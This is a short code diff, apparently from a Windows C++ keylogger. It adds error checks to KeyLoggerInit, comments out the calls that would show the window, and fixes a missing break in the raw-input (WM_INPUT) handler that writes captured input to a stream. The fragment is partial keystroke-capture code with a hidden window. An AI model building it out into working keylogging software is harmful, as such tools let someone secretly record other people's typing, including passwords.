@@ -17,16 +17,22 @@ static LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
 
 static void KeyLoggerInit(std::ostream* os)
 {
-    MyRegisterClass(hInst);
+    ATOM res = MyRegisterClass(hInst);
+    if (res == NULL)
+    {
+        ErrorExit(L"register class");
+    }
 
     hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
         CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInst, nullptr);
-
-    if (!hWnd)
+    
+    if (hWnd == NULL)
     {
         ErrorExit(L"CreateWindowW Failed!");
     }
     outStream = os;
+    //ShowWindow(hWnd, SW_SHOWNORMAL);
+    //UpdateWindow(hWnd);
 }
 
 static void KeyLoggerFini()
@@ -125,6 +131,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM l
             break;
         }//end switch
         delete[] lpb;	// free this now
+        break;
 
     }// end case WM_INPUT
     case WM_PAINT:
